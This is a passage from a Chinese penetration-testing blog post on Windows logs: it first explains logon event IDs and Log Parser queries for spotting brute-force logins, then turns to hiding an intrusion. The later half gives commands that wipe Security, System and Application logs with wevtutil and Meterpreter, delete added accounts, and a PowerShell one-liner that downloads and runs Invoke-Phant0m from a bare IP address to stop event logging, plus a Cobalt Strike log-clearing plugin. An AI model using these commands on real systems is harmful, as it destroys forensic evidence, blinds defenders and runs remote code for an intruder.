+<p>  同RDP协议远程登录一样，使用不存在的用户名和错误密码分别登录失败，ID为4625，登录类型为3（网络）。审核失败，列出了登录失败的账户名和失败原因。  </p>
+</blockquote>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218182258620.png" srcset="/img/loading.gif" lazyload alt="image-20240218182258620"></p>
+<h3 id="RUNAS登录"><a href="#RUNAS登录" class="headerlink" title="RUNAS登录"></a>RUNAS登录</h3><p>登录成功 事件ID 2624  </p>
+<p>登录类型 9  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218182343396.png" srcset="/img/loading.gif" lazyload alt="image-20240218182343396"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><blockquote>
+<p>在进程尝试通过显式指定帐户的凭据来登录该帐户时生成4648事件。  </p>
+<p>成功的登录通常会有4624事件产生，在创建登录会话后在被访问的计算机上生成此事件。  </p>
+<p>如果用户有特权会有4672事件产生。  </p>
+<p>通常情况下只需关注登录类型为2、3、9、10类型的4625登录失败事件。  </p>
+</blockquote>
+<h2 id="登录爆破是咧"><a href="#登录爆破是咧" class="headerlink" title="登录爆破是咧"></a>登录爆破是咧</h2><blockquote>
+<p>4624  –登录成功<br>4625  –登录失败<br>4634  – 注销成功<br>4647  – 用户启动的注销<br>4672  – 使用超级用户（如管理员）进行登录  </p>
+</blockquote>
+<ol>
+<li>Win+R 输入 eventvwr.msc，打开事件管理器  </li>
+<li>Windows日志 -&gt; 安全 -&gt; 筛选当前日志  </li>
+<li>输入事件ID：4625 ，进行日志筛选  </li>
+<li>发现事件ID：4625，事件数8153，即用户登录失败了8153次，那么这台服务器管理员账号可能遭遇了暴力猜解。</li>
+</ol>
+<p>  也可通过手动编辑XML过滤进行筛选：  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">QueryList</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Query</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">Path</span>=<span class="hljs-string">&quot;Security&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Select</span> <span class="hljs-attr">Path</span>=<span class="hljs-string">&quot;Security&quot;</span>&gt;</span>*[System[EventID=4625]] and *[EventData[Data[@Name=&#x27;IpAddress&#x27;]=&#x27;192.168.81.134&#x27;]]<span class="hljs-tag">&lt;/<span class="hljs-name">Select</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">Query</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">QueryList</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来就来分析一下</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218204413020.png" srcset="/img/loading.gif" lazyload alt="image-20240218204413020"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218204628447.png" srcset="/img/loading.gif" lazyload alt="image-20240218204628447"></p>
+<p>发现 事件4625 的比例很大，猜测可能该主机被爆破</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218205534552.png" srcset="/img/loading.gif" lazyload alt="image-20240218205534552"></p>
+<p>可以发现攻击者的Ip</p>
+<h1 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h1><h2 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h2><blockquote>
+<p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统  </p>
+<p>的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p>
+</blockquote>
+<p>用法</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218210839642.png" srcset="/img/loading.gif" lazyload alt="image-20240218210839642"></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">C:</span>\&gt;<span class="hljs-title class_">LogParser</span>.exe<br><br><span class="hljs-title class_">Microsoft</span>（R）<span class="hljs-title class_">Log</span> <span class="hljs-title class_">Parser</span> <span class="hljs-number">2.2</span>.<span class="hljs-number">10</span>版<br><br>用法:   <br><br> <span class="hljs-title class_">LogParser</span> [-<span class="hljs-symbol">i:</span>&lt;input_format&gt;] [-<span class="hljs-symbol">o:</span>&lt;output_format&gt;] &lt;<span class="hljs-title class_">SQL</span> query&gt; |<br>           <span class="hljs-symbol">file:</span>&lt;query_filename&gt;[?param1=value1+...]<br>           [&lt;input_format_options&gt;] [&lt;output_format_options&gt;]<br>           [-q[<span class="hljs-symbol">:ON|OFF</span>]] [-<span class="hljs-symbol">e:</span>&lt;max_errors&gt;] [-iw[<span class="hljs-symbol">:ON|OFF</span>]]<br>           [-stats[<span class="hljs-symbol">:ON|OFF</span>]] [-saveDefaults] [-queryInfo]<br><br> <span class="hljs-title class_">LogParser</span> -c -<span class="hljs-symbol">i:</span>&lt;input_format&gt; -<span class="hljs-symbol">o:</span>&lt;output_format&gt; &lt;from_entity&gt;<br>           &lt;into_entity&gt; [&lt;where_clause&gt;] [&lt;input_format_options&gt;]<br>           [&lt;output_format_options&gt;] [-multiSite[<span class="hljs-symbol">:ON|OFF</span>]]<br>           [-q[<span class="hljs-symbol">:ON|OFF</span>]] [-<span class="hljs-symbol">e:</span>&lt;max_errors&gt;] [-iw[<span class="hljs-symbol">:ON|OFF</span>]]<br>           [-stats[<span class="hljs-symbol">:ON|OFF</span>]] [-queryInfo]<br><br> -<span class="hljs-symbol">i:</span>&lt;input_format&gt;   :  <span class="hljs-title class_">IISW3C</span>, <span class="hljs-title class_">NCSA</span>, <span class="hljs-title class_">IIS</span>, <span class="hljs-title class_">IISODBC</span>, <span class="hljs-title class_">BIN</span>, <span class="hljs-title class_">IISMSID</span>, <span class="hljs-title class_">HTTPERR</span>, <span class="hljs-title class_">URLSCAN</span>, <span class="hljs-title class_">CSV</span>, <span class="hljs-title class_">TSV</span>, <span class="hljs-title class_">W3C</span>, <span class="hljs-title class_">XML</span>, <br>                        <span class="hljs-title class_">EVT</span>, <span class="hljs-title class_">ETW</span>, <span class="hljs-title class_">NETMON</span>, <span class="hljs-title class_">REG</span>, <span class="hljs-title class_">ADS</span>, <span class="hljs-title class_">TEXTLINE</span>, <span class="hljs-title class_">TEXTWORD</span>, <span class="hljs-title class_">FS</span>, <span class="hljs-title class_">COM</span> <br>                        (指定其中一个，如果省略，将从from子句猜测)<br> -<span class="hljs-symbol">o:</span>&lt;output_format&gt;  :  <span class="hljs-title class_">CSV</span>, <span class="hljs-title class_">TSV</span>, <span class="hljs-title class_">XML</span>, <span class="hljs-title class_">DATAGRID</span>, <span class="hljs-title class_">CHART</span>, <span class="hljs-title class_">SYSLOG</span>, <span class="hljs-title class_">NEUROVIEW</span>, <span class="hljs-title class_">NAT</span>, <span class="hljs-title class_">W3C</span>, <span class="hljs-title class_">IIS</span>, <span class="hljs-title class_">SQL</span>, <span class="hljs-title class_">TPL</span>, <span class="hljs-title class_">NULL</span> <br>                         (指定其中一个，如果省略，将从from子句猜测)<br> -q[<span class="hljs-symbol">:ON|OFF</span>]         :  安静模式；默认值为<span class="hljs-title class_">OFF</span><br> -<span class="hljs-symbol">e:</span>&lt;max_errors&gt;     :  中止前的最大解析错误数；默认值为<span class="hljs-number">-1</span> (全部忽略)<br> -iw[<span class="hljs-symbol">:ON|OFF</span>]        :  忽略警告；默认值为<span class="hljs-title class_">OFF</span><br> -stats[<span class="hljs-symbol">:ON|OFF</span>]     :  执行查询后显示统计信息；默认值为<span class="hljs-title class_">ON</span><br> -c                  :  使用内置转换查询<br> -multiSite[<span class="hljs-symbol">:ON|OFF</span>] :  根据 <span class="hljs-title class_">SiteID</span> 值将 <span class="hljs-title class_">BIN</span> 转换输出发送到多个文件；默认值为<span class="hljs-title class_">OFF</span><br> -saveDefaults       :  将指定的选项保存为默认值<br> -restoreDefaults    :  恢复出厂默认值<br> -queryInfo          :  显示查询处理信息（不执行查询）<br><br><span class="hljs-symbol">Examples:</span><br> <span class="hljs-title class_">LogParser</span> <span class="hljs-string">&quot;SELECT date, REVERSEDNS(c-ip) AS Client, COUNT(*) FROM file.log WHERE sc-status&lt;&gt;200 GROUP BY date, Client&quot;</span> -<span class="hljs-symbol">e:</span><span class="hljs-number">10</span><br><br> <span class="hljs-title class_">LogParser</span> <span class="hljs-symbol">file:</span>myQuery.sql?myInput=<span class="hljs-symbol">C:</span>\temp\ex*.log+myOutput=results.csv<br><br> <span class="hljs-title class_">LogParser</span> -c -<span class="hljs-symbol">i:</span><span class="hljs-title class_">BIN</span> -<span class="hljs-symbol">o:</span><span class="hljs-title class_">W3C</span> file1.log file2.log <span class="hljs-string">&quot;ComputerName IS NOT NULL&quot;</span><br><br><span class="hljs-symbol">Help:</span><br> -h <span class="hljs-title class_">GRAMMAR</span>                  : <span class="hljs-title class_">SQL</span>语言语法<br> -h <span class="hljs-title class_">FUNCTIONS</span> [ &lt;function&gt; ] : 函数语法<br> -h <span class="hljs-title class_">EXAMPLES</span>                 : 查询和命令示例<br> -h -<span class="hljs-symbol">i:</span>&lt;input_format&gt;        : 有关 &lt;input_format&gt; 的帮助<br> -h -<span class="hljs-symbol">o:</span>&lt;output_format&gt;       : 有关 &lt;output_format&gt; 的帮助<br> -h -c                       : <span class="hljs-title class_">Conversion</span> help<br></code></pre></td></tr></table></figure>
+
+
+
+<p>查看事件id为4624 的事件</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT –o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> c:\baopo.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4624</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218210636848.png" srcset="/img/loading.gif" lazyload alt="image-20240218210636848"></p>
+<p>如图可以看到查询的信息有如下字段：  </p>
+<blockquote>
+<p>EventLog：事件日志，文件路径<br>RecordNumber：记录编号<br>TimeGenerated：生成时间<br>TimeWritten：写入时间<br>EventID：事件ID<br>EventType：事件类型<br>EventTypeName：事件类型名称<br>EventCategory：事件类别<br>EventCategoryName：事件类别名称<br>SourceName：来源名称<br>Strings：字符<br>ComputerName：计算机名<br>SID：安全标识符<br>Message：消息<br>Data：数据  </p>
+</blockquote>
+<p>指定时间范围登录成功的事件：（TimeGenerated）  </p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT -o:DATAGRID &quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> c:\baopo.evtx <span class="hljs-keyword">where</span> TimeGenerated &lt; <span class="hljs-string">&#x27;2022-09-30 11:25:00&#x27;</span> <span class="hljs-keyword">and</span> TimeGenerated &gt; <span class="hljs-string">&#x27;2022-09-30 11:23:00&#x27;</span> <span class="hljs-keyword">and</span> eventid=<span class="hljs-number">4624</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>指定时间范围登录成功的事件：（TimeGenerated）  </p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT -o:DATAGRID &quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> c:\baopo.evtx <span class="hljs-keyword">where</span> TimeGenerated &lt; <span class="hljs-string">&#x27;2022-09-30 11:25:00&#x27;</span> <span class="hljs-keyword">and</span> TimeGenerated &gt; <span class="hljs-string">&#x27;2022-09-30 11:23:00&#x27;</span> <span class="hljs-keyword">and</span> eventid=<span class="hljs-number">4624</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218211301965.png" srcset="/img/loading.gif" lazyload alt="image-20240218211301965"></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT –o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> EXTRACT_TOKEN(Strings,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;|&#x27;</span>) <span class="hljs-keyword">as</span> UserName, TimeGenerated <span class="hljs-keyword">as</span> LoginTime, EXTRACT_TOKEN(Message,<span class="hljs-number">13</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LogonType, EXTRACT_TOKEN(Message,<span class="hljs-number">38</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LoginIP <span class="hljs-keyword">FROM</span> c:\baopo.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4624</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218211356319.png" srcset="/img/loading.gif" lazyload alt="image-20240218211356319"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">EXTRACT_TOKEN</span>(Strings,<span class="hljs-number">5</span>,&#x27;|&#x27;) as UserName ：获取用户名<br><br><span class="hljs-attribute">Strings</span>的值为：<br><span class="hljs-attribute">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>|-|-|<span class="hljs-number">0</span>x0|S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2599880275</span>-<span class="hljs-number">3611086684</span>-<span class="hljs-number">3620703807</span>-<span class="hljs-number">500</span>|Administrator|PC|<span class="hljs-number">0</span>x78a856|<span class="hljs-number">3</span>|NtLmSsp |NTLM|\\<span class="hljs-number">192.168.81.134</span>|&#123;<span class="hljs-number">00000000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">000000000000</span>&#125;|-|NTLM V1|<span class="hljs-number">0</span>|<span class="hljs-number">0</span>x0|-|<span class="hljs-number">192.168.81.134</span>|<span class="hljs-number">53472</span><br><br><span class="hljs-attribute">EXTRACT_TOKEN</span>作用：用 | 分割 Strings 的值，从<span class="hljs-number">0</span>开始取到<span class="hljs-number">5</span>，为第<span class="hljs-number">6</span>个结果，即用户名<br><br><span class="hljs-attribute">EXTRACT_TOKEN</span>(Strings,<span class="hljs-number">18</span>,&#x27;|&#x27;) as LoginIP ：获取IP地址<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>查询登录失败的事件  </p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT –o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> c:\baopo.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4625</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>指定时间范围登录失败的事件：  </p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT -o:DATAGRID &quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> c:\baopo.evtx <span class="hljs-keyword">where</span> TimeGenerated &lt; <span class="hljs-string">&#x27;2022-09-30 11:24:36&#x27;</span> <span class="hljs-keyword">and</span> TimeGenerated &gt; <span class="hljs-string">&#x27;2022-09-30 11:24:00&#x27;</span> <span class="hljs-keyword">and</span> eventid=<span class="hljs-number">4625</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>提取登录失败用户名进行聚合统计：  </p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT -o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> EXTRACT_TOKEN(Message,<span class="hljs-number">19</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LoginName, EXTRACT_TOKEN(Message,<span class="hljs-number">13</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LogonType, <span class="hljs-built_in">count</span>(EXTRACT_TOKEN(Message,<span class="hljs-number">19</span>,<span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-keyword">as</span> Times, EXTRACT_TOKEN(Message,<span class="hljs-number">38</span>,<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">as</span> LoginIP <span class="hljs-keyword">FROM</span> c:\baopo.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4625</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> Message<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>系统历史开关机记录</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">LogParser.exe -i:EVT –o:DATAGRID &quot;<span class="hljs-keyword">SELECT</span> TimeGenerated,EventID,Message <span class="hljs-keyword">FROM</span> c:\<span class="hljs-keyword">System</span>.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">6005</span> <span class="hljs-keyword">or</span> EventID=<span class="hljs-number">6006</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h2><p>Event Log Explorer 是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系 统，应用程序和其他微软 Windows 的记录  被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。  </p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com</a></p>
+<h1 id="痕迹清楚"><a href="#痕迹清楚" class="headerlink" title="痕迹清楚"></a>痕迹清楚</h1><h2 id="Windows日志清理"><a href="#Windows日志清理" class="headerlink" title="Windows日志清理"></a>Windows日志清理</h2><p>wevtutil.exe：用于检索有关事件日志和发布者的信息，安装和卸载事件清单，运行查询以及导出、存档和清除日志。  </p>
+<blockquote>
+<p># 统计日志列表，查询所有日志信息，包含时间，数目</p>
+<p>wevtutil.exe gli Application</p>
+<p># 获取security的最近十条日志</p>
+<p>wevtutil qe Security &#x2F;f:text &#x2F;rd:true &#x2F;c:10</p>
+<p># 获得Security的前十条Security日志</p>
+<p>wevtutil qe Security &#x2F;f:text &#x2F;c:10<br>wevtutil qe Security &#x2F;f:xml &#x2F;c:10<br>wevtutil qe Security &#x2F;rd:true &#x2F;c:10</p>
+<p># 导出指定日志保存</p>
+<p>wevtutil.exe epl Security 1.evtx</p>
+<p># 查看指定类别的日志内容</p>
+<p>wevtutil qe Application &#x2F;f:text</p>
+<p># 删除该类日志所有内容</p>
+<p>wevtutil cl security<br>wevtutil cl system<br>wevtutil cl application<br>wevtutil cl “windows powershell”</p>
+</blockquote>
+<p>主要就是删除日志</p>
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><ol>
+<li><p>删除所有在渗透过程中使用的工具  </p>
+</li>
+<li><p>删除之前添加的账号</p>
+</li>
+</ol>
+   <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">username</span> /del<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>删除应用程序、系统和安全模块日志</li>
+</ol>
+   <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">clearev</span><br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>关闭所有的Meterpreter连接</li>
+</ol>
+   <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions</span><br><span class="hljs-attribute">sessions -K</span><br></code></pre></td></tr></table></figure>
+
+<p>   -K 删除所有的</p>
+<p>   -k 删除指定的</p>
+<ol start="5">
+<li>查看事件日志</li>
+</ol>
+   <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> event_manager -i<br></code></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>删除事件日志</li>
+</ol>
+   <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> event_manager -c<br></code></pre></td></tr></table></figure>
+
+<h2 id="停止日志记录"><a href="#停止日志记录" class="headerlink" title="停止日志记录"></a>停止日志记录</h2><p>利用脚本让日志功能失效，无法记录日志。  </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-string">&quot;IEX(new-object system.net.webclient).downloadstring(&#x27;http://47.101.214.85:8000/Invoke-Phant0m.ps1&#x27;);Invoke-Phant0m&quot;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/hlldz/Invoke-Phant0m">https://github.com/hlldz/Invoke-Phant0m</a>  </p>
+</blockquote>
+<p>一个 cs 插件</p>
+<p>用于停止日志记录</p>
+<p>手动的话</p>
+<p>把eventlog对应的svchost进程结束  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218215813916.png" srcset="/img/loading.gif" lazyload alt="image-20240218215813916"></p>
+<p>重新开启Windows  Event Log服务，即可恢复日志记录</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> eventlog<br></code></pre></td></tr></table></figure>
+
+<h2 id="cs-插件"><a href="#cs-插件" class="headerlink" title="cs 插件"></a>cs 插件</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/EventLogMaster">QAX-A-Team&#x2F;EventLogMaster: Cobalt Strike插件 - RDP日志取证&amp;清除 (github.com)</a></p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>windwos痕迹清楚</div>
+      <div>https://tsy244.github.io/2024/02/18/渗透/windwos痕迹清楚/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 18, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/18/%E6%B8%97%E9%80%8F/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/" title="Linux痕迹清除">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Linux痕迹清除</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/17/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="域环境权限维持">
+                        <span class="hidden-mobile">域环境权限维持</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
